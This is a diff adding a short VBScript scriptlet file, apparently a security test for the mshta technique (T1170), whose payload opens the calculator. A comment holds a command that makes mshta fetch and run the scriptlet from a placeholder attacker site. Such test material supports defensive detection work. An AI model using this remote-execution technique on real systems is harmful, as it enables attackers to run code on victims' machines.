@@ -1,0 +1,19 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <!-- Test -->
+  <!-- mshta.exe https://<yourevilsite>/T1170.sct -->
+
+<registration
+    description="MSHTA_Example"
+    progid="PoC"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}" >
+
+<script language="VBScript">
+	Set WshShell = CreateObject("WScript.Shell")
+	WshShell.Run("calc.exe")
+	self.close
+</script>
+	
+</registration>
+</scriptlet>
